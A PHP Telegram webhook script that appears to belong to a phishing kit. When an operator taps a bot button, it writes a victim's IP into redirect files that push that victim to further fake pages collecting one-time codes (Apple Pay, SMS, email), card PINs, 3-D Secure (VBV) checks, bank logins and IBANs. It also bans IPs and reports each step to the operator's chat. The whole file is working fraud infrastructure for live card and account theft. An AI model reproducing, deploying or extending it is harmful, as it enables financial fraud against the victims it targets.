<?php

include('functions.php');
include('../config.php');

$update = json_decode(file_get_contents("php://input"), true);

if (isset($update["callback_query"])) {
    
    $callbackQuery = $update["callback_query"];
    $messageId = $callbackQuery["message"]["message_id"];
    $data = $callbackQuery["data"];
    $username = $callbackQuery["from"]["username"];

    list($action, $ip) = explode('=', $data);

    $txtFileDossier = '../id1.txt';
    $txtFileLoading = '../id5.txt';
    
    $fileContentDossier = file_get_contents($txtFileDossier);
    $dossier = trim($fileContentDossier);

    $fileContentLoading = file_get_contents($txtFileLoading);
    $loading = trim($fileContentLoading);

    // OTP APPLE PAY

    if ($action == 'otp') {
        writeOnFile("../{$dossier}/{$loading}/redirect/otp.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP", null, $messageId);
    }
    elseif ($action == 'otperror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/otperror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP INVALIDE", null, $messageId);
    }

    // BAN IP 

    elseif ($action == 'ban') {
        writeOnFile("../bl.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> BAN", null, $messageId);
    } 

    // INVALID CARD

    elseif ($action == 'carteInvalide') {
        writeOnFile("../{$dossier}/{$loading}/redirect/carteInvalide.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> CARTE INVALIDE", null, $messageId);
    } 
    
    // OTP SMS

    elseif ($action == 'sms') {
        writeOnFile("../{$dossier}/{$loading}/redirect/sms.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP SMS", null, $messageId);
    } 
    elseif ($action == 'smserror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/smserror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP SMS INVALIDE", null, $messageId);
    }

    // LOG BANK
    
    elseif ($action == 'bank') {
        writeOnFile("../{$dossier}/{$loading}/redirect/bank.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> LOG BANK", null, $messageId);
    } 
    elseif ($action == 'bankerror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/bankerror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> LOG BANK INVALIDE", null, $messageId);
    }

    // OTP MAIL

    elseif ($action == 'mail') {
        writeOnFile("../{$dossier}/{$loading}/redirect/mail.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP MAIL", null, $messageId);
    }
    elseif ($action == 'mailerror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/mailerror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> OTP MAIL INVALIDE", null, $messageId);
    }

    // PIN

    elseif ($action == 'pin') {
        writeOnFile("../{$dossier}/{$loading}/redirect/pin.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> PIN", null, $messageId);
    }
    elseif ($action == 'pinerror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/pinerror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> PIN INVALIDE", null, $messageId);
    }

    // VBV

    elseif ($action == 'vbv') {
        writeOnFile("../{$dossier}/{$loading}/redirect/vbv.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> VBV", null, $messageId);
    }
    elseif ($action == 'vbvgood') {
        writeOnFile("../{$dossier}/{$loading}/redirect/vbvgood.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> VBV VALIDE", null, $messageId);
    }

    // elseif ($action == 'vbv') {
    //     sendMessage($telegram['RezChatId']['card'], "Mise à jour sur cette option ! de nouveau disponible dans la prochaine mise à jour", null, $messageId);
    // }

    // DOCS

    elseif ($action == 'docs') {
        sendMessage($telegram['RezChatId']['card'], "Cette option n'est pas encore disponible ! RDV dans la prochaine mise à jour :)", null, $messageId);
    }

    // IBAN

    elseif ($action == 'iban') {
        writeOnFile("../{$dossier}/{$loading}/redirect/iban.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> IBAN", null, $messageId);
    }
    elseif ($action == 'ibanerror') {
        writeOnFile("../{$dossier}/{$loading}/redirect/ibanerror.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> IBAN INVALIDE", null, $messageId);
    }

    // FIN

    elseif ($action == 'fin') {
        writeOnFile("../{$dossier}/{$loading}/redirect/fin.txt", $ip);
        sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> FIN", null, $messageId);
    }
}